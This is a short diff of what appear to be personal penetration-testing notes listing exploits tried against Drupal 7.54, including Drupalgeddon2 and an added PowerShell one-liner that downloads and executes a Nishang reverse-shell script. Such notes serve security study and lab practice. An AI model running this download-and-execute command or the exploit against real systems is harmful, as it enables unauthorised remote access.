@@ -519,16 +519,13 @@ Pattern
          
 5.0 Tried exploits
    Drupal 7.54
-      https://github.com/pimps/CVE-2018-7600
-      
+      Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code  php/webapps/44449.rb 
+      powershell "IEX(new-object net.webclient).downloadstring('nishang_shell')" 
+   
 
    
    
-            
-                    
-                    
-  
-            
+                        
        
 
 https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
